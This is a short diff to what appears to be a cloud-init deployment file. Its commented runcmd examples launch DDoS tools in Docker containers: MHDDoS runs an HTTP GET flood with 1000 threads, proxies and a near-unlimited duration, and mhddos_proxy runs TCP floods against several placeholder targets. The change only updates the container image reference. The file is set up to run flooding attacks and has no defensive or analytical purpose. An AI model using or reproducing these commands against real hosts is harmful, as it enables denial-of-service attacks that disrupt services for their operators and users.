@@ -19,5 +19,4 @@ runcmd:
 # Layer 7 Attack: method - GET flood, link - https://example.in.com, socks5 proxy enabled - 5, threads - 1000, file with proxy IPs - proxy.txt, request per connection 100, duration 999999 seconds
 #  - "docker run --name mhddos --rm -d djebos/mhddos:latest get https://example.in.com 5 1000 proxy.txt 100 999999"
 # Also you can use mhddos_proxy. It supports multiple targets, multiple attack methods and auto proxy refresh. Look at example below:
-#  - "docker run --name mhddos -d --rm portholeascend/mhddos_proxy tcp://1.2.3.4:80 tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug"
-
+#  - "docker run --name mhddosProxy -d --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://1.2.3.4:80 tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug"
